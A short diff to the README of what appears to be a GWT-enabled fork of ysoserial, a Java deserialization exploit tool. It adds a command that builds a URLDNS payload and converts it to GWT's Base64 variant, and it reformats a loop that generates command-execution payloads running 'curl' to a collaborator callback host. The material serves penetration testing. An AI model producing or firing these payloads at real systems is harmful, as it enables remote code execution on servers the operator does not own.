@@ -44,6 +44,16 @@ Usage: java -jar ysoserial-[version]-all.jar [options] <payload> '<command>'
       ex. --gwt default
 ```
 
+To create a GWT payload and convert it directly to the customized Base64 encoding that GWT typically expects, you can use a command like the following:
+
+```
+java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar \
+   --gwt bishopfox \
+   URLDNS \
+   https://bishopfox.com \
+   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' > URLDNS.bin.b64
+```
+
 ## Build error troubleshooting
 
 ### ysoserial requires Java 11
@@ -141,8 +151,7 @@ while read pn; do \
    --gwt "${FIELDNAME}" \
    "${pn}" \
    "curl http://${COLLABORATOR}/${pn}" \
-   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' \
-   > "payloads-${COLLABORATOR}/${pn}.bin.b64"; \
+   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' > "payloads-${COLLABORATOR}/${pn}.bin.b64"; \
    done<command_execution_payloads.txt
 ```
 
